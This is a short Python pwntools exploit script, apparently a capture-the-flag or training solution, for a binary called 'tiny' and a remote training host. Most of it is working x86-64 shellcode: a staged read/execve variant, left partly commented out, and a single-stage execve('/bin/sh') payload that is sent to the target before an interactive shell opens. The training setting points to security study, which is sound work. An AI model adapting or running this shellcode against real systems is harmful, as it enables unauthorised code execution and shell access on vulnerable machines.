from pwn import *
import sys

asm_first_stage = """
xor edi, edi
push rdx
pop rsi
xor edx, edx
push 100
pop dx
syscall
"""

asm_second_stage = """
mov rdi, rsi
add rdi, 0x22
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

asm_code = """
push rdx
pop rax
add al, 0x10
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
xor esi, esi
syscall
.string "/bin/sh"
"""

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./tiny")
		gdb.attach(p, """
		b *play+601
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./tiny"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 4101)
else:
	p = process("./tiny")


shellcode_first_stage = asm(asm_first_stage)
shellcode_second_stage = asm(asm_second_stage)


#p.sendline(shellcode_first_stage)
#input("send second stage...")
#p.sendline(12*b"\x90" + shellcode_second_stage + b"\x41"*20)

p.sendline(asm(asm_code))

p.interactive()